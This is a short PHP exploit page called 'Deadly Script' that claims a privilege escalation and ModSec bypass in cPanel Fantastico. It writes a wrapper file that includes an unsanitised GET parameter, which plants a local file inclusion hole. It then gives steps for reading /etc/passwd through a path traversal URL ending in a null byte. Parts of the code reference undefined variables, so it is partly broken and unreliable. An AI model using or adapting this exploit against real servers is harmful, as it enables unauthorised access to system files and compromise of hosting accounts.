set_time_limit(0);
if(isset($_POST['sup3r'])) {
if(stristr(php_uname(),"2.6.") && stristr(php_uname(),"Linux")) {
$phpwrapper = '<?php
include_once("./language/".$_GET[sup3r].".php");
?>
';
fwrite($h,$prctl);
fclose($h);
$handle = fopen($_POST['php'], "w");
fwrite($handle, $phpwrapper);
fclose($handle);
echo "Building exploit...<br />";
echo "coding by Super-Crystal <br />";
echo "Cleaning up<br />";
echo "Done!<br />
</pre>";
} else {
echo "error : ".php_uname();
}
} else {
?>
<div align="center">
<h3>Deadly Script</h3>
<font color=red>Cpanel fantastico Privilege Escalation "ModSec and PHP restriction Bypass"</font><br />
<pre><div align="center">
</pre></div><br />
<table border="0" cellspacing="0">
<tr>
<form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="post">
<table border="0" cellspacing="0">
<tr>
<td><div align="right">Exploit:</div></td>
<td>
<select name="exploit">
<option selected="selected">Cpanel fantastico Privilege Escalation "ModSec and PHP restriction Bypass"</option>
</select>
</td>
</tr>
<tr>
<td><div align="right">change</div></td>
<td><input type="text" name="php" size="50" value="<?php echo getcwd()."/language.php" ?>" /></td>
</tr>
<tr>
</table>
</div>
<input type="hidden" name="sup3r" value="doit" />
<input name="submit" type="submit" value="Submit" /><br />
1- change /home/[user]/.fantasticodata/language.php
<br />
2- click on the submit
<br />
3- now put it like this (e.g)
: http://www.xxxx.com:2082/frontend/x3/fantastico/index.php?sup3r=../../../../../../etc/passwd%00 .
<br />
<font color=red>Written: 10.10.2008</font><br />
<font color=blue>Public: 26.11.2008</font><br />
<div align="center">
<font color=red>Author : Super-Crystal</font><br />
<a href="http://www.arab4services.net">Arab4services.net </a></center>
</div>
</form>
<?php } ?>